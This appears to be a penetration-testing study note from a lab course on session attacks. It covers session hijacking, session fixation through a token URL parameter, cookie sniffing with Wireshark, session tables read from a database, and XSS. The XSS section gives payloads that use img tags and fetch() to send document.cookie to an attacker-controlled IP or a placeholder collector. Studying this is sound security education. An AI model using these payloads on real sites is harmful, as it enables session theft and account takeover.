# 📉 Session Attacks 1

## Session Hijacking

Here the attacker takes advantage of insecure session identifiers, finds a way to obtain them, and uses them to authenticate to the server and impersonate the victim

Let's imagine the following account of some target.

<figure><img src="../../../.gitbook/assets/image (1361).png" alt=""><figcaption></figcaption></figure>

We can see cookie named `auth-session`

As an attacker we somehow got access to the cookie's value, we can go in a new private window, navigate to the website and replace the current auth-session cookie's value with the one we got. Normally if we reload the page, we will be logged in as the target

## Session Fixation

Session Fixation occurs when an attacker can fixate a (valid) session identifier.

Here are the 3 stages of a Session Fixation attacks:

**Stage 1: Attacker manages to obtain a valid session identifier**

**Stage 2: Attacker manages to fixate a valid session identifier**

**Stage 3: Attacker tricks the victim into establishing a session using the abovementioned session identifier**

Let's got through the 3 steps more in depth:

**Part 1: Session fixation identification**

We will have some random URL with some token value

```
http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN VALUE>
```

<figure><img src="../../../.gitbook/assets/image (1362).png" alt=""><figcaption></figcaption></figure>

So we see the cookie is the same as the token value

**Part 2: Session fixation exploitation attempt**

Let's open a new private windows and add our own token value, we will end up navigating to ->

```
http://oredirect.htb.net/?redirect_uri=/complete.html&token=IControlThisCookie
```

&#x20;

<figure><img src="../../../.gitbook/assets/image (1363).png" alt=""><figcaption><p>same value once again</p></figcaption></figure>

We could send a URL similar to the above to a victim. If the victim logs into the application, we could easily hijack their session since the session identifier is already known (we fixated it).

Another way of looking for some fixation problems, let's say we got a cookie named `PHPSESSID, we could try http://insecure.exampleapp.com/login?PHPSESSID=AttackerSpecifiedCookieValue` and see if the specified cookie value is propagated to the application

## Obtaining Session Identifiers without User Interaction

We can obtain obtain session identifiers two main ways:

* without user interaction
* requiring user interaction

### via Traffic Sniffing

Traffic sniffing requires the attacker and the victim to be on the same local network. Then and only then can HTTP traffic be inspected by the attacker. It is impossible for an attacker to perform traffic sniffing remotely.

Let's go on our target website:

<figure><img src="../../../.gitbook/assets/image (1364).png" alt=""><figcaption><p>note <code>auth-session,</code> probably as a session identifier</p></figcaption></figure>

Now, we'll start wireshark on the local network:

```shell-session
sudo -E wireshark
```

Right-click "tun0" and then click "Start capture"

Now in a rivate window, we login to the app using knwon credentials with an account we created and look at the traffic:

<figure><img src="../../../.gitbook/assets/image (1365).png" alt=""><figcaption></figcaption></figure>

We don't forget the http filter, then we will need to filter everything out for any `auth-session` cookies with `Edit` -> `Find Packet`

<figure><img src="../../../.gitbook/assets/image (1366).png" alt=""><figcaption></figcaption></figure>

and when we find the packet we need we can copy the value like this:

<figure><img src="../../../.gitbook/assets/image (1367).png" alt=""><figcaption></figcaption></figure>

**Part 4: Hijack the victim's session**

and now if we go back to the not private window and change our current cookie value with the one we obtained through wireshark (remember to remove the `auth-session=` part)&#x20;

<figure><img src="../../../.gitbook/assets/image (1368).png" alt=""><figcaption></figcaption></figure>

And if we refresh we are now loggid in as the victim

### Post-Exploitation (Database Access)

When we have access to a database via, for example, SQL injection or identified credentials, we should always check for any stored user sessions.

<figure><img src="../../../.gitbook/assets/image (1369).png" alt=""><figcaption></figcaption></figure>

We can try to crack the hashes, but we also see the interesting session table ->

```sql
select * from all_sessions;
select * from all_sessions where id=3;
```

<figure><img src="../../../.gitbook/assets/image (1370).png" alt=""><figcaption><p>We could now authenticate as the user "Developer."</p></figcaption></figure>

## Cross-Site Scripting (XSS)

For a Cross-Site Scripting (XSS) attack to result in session cookie leakage, the following requirements must be fulfilled:

* Session cookies should be carried in all HTTP requests
* Session cookies should be accessible by JavaScript code (the HTTPOnly attribute should be missing)

First let's create an account to look at functionalities ->

To craft our payload, it's good to use handlers like `onload` or `onerror` since they fire up automatically, if they're blocked, we can  use something like `onmouseover`.

```javascript
"><img src=x onerror=prompt(document.domain)>
```

`document.domain` to ensure that JavaScript is being executed on the actual domain and not in a sandboxed environment.

and in the remaining fields, we can put the following:

```javascript
"><img src=x onerror=confirm(1)>
```

```javascript
"><img src=x onerror=alert(1)>
```

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

When we save we gor nothing poping on our screen, that's because we need to call the code with another functionality ->&#x20;

When we click on share:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we need to check if _HTTPOnly_ is off

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

To steal a cookie in real world we can use [XSSHunter](https://xsshunter.com), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or webhook.site

The payload would look somehing like:

```javascript
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

{% content-ref url="../../../red-team/technical-knowledge/web-application/xss-injection.md" %}
[xss-injection.md](../../../red-team/technical-knowledge/web-application/xss-injection.md)
{% endcontent-ref %}

Now let's say the victim clicks on our link, in our webhook or anything else, we should see our cookie pop and can use it to hijack session

### cookies via XSS (Netcat edition)

First we place the below payload in the _Country_ field of Ela Stienen's profile and click "Save."

```javascript
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

Then we launch netcat on port 8000

now we simulate what the victim would do and navigate to `http://xss.htb.net/profile?email=ela.stienen@example.com` since we control this public profile hosting a cookie-stealing payload

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can use `fetch()`, which can fetch data (cookies) and send it to our server without any redirects.

```javascript
<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
```

##
